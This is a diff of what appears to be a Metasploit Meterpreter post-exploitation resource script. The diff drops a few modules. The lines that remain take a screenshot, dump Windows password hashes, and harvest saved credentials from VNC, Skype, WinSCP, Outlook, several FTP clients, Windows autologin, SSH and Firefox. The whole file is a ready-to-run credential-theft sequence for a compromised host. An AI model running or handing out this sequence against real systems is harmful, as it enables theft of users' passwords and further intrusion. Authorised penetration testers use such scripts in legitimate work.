@@ -1,12 +1,9 @@
 sysinfo
-show_mount
 screenshot -v -p dump.jpeg -v true
-run post/multi/gather/env
 run post/windows/gather/hashdump
 run post/windows/gather/credentials/vnc
 run post/windows/gather/credentials/skype
 run post/windows/gather/credentials/winscp
-run post/windows/gather/credentials/coreftp
 run post/windows/gather/credentials/outlook
 run post/windows/gather/credential_collector
 run post/windows/gather/credentials/smartftp
@@ -14,8 +11,5 @@ run post/windows/gather/credentials/ftpnavigator
 run post/windows/gather/credentials/filezilla_server
 run post/windows/gather/credentials/windows_autologin
 run post/multi/gather/ssh_creds
-run post/firefox/gather/cookies
 run post/firefox/gather/passwords
-run post/multi/gather/pidgin_cred
 run post/multi/gather/firefox_creds
-
